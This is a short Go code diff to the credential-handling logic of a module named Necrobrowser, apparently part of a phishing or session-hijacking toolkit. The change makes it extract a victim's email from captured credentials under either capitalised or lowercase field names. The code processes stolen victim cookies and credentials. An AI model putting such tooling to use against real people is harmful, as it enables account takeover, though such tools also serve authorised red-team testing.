@@ -248,21 +248,38 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 			}
 		}
 	}
-	// Format 2: [{"key":"Email","val":"x","time":"..."}] or [{"key":"Username","val":"x","time":"..."}]
+	// Format 2: [{"Key":"Email","Value":"x","Time":"..."}]
+	// VictimCredential has no json tags, so Go marshals as Key/Value/Time (capitalized).
+	// We also handle lowercase key/val for safety.
 	if email == "" {
 		var credsArr []map[string]interface{}
 		if err := json.Unmarshal([]byte(credentialsJSON), &credsArr); err == nil {
 			for _, target := range emailFields {
 				for _, cred := range credsArr {
-					if key, ok := cred["key"]; ok {
-						if keyStr, ok := key.(string); ok && strings.EqualFold(keyStr, target) {
-							if val, ok := cred["val"]; ok {
-								if strVal, ok := val.(string); ok && strVal != "" {
-									email = strVal
-									break
-								}
+					// Find the credential key field (try Key, key)
+					credKey := ""
+					for k, v := range cred {
+						if strings.EqualFold(k, "key") {
+							if s, ok := v.(string); ok {
+								credKey = s
+								break
 							}
 						}
+					}
+					if !strings.EqualFold(credKey, target) {
+						continue
+					}
+					// Find the credential value field (try Value, val, value)
+					for k, v := range cred {
+						if strings.EqualFold(k, "value") || strings.EqualFold(k, "val") {
+							if s, ok := v.(string); ok && s != "" {
+								email = s
+								break
+							}
+						}
+					}
+					if email != "" {
+						break
 					}
 				}
 				if email != "" {
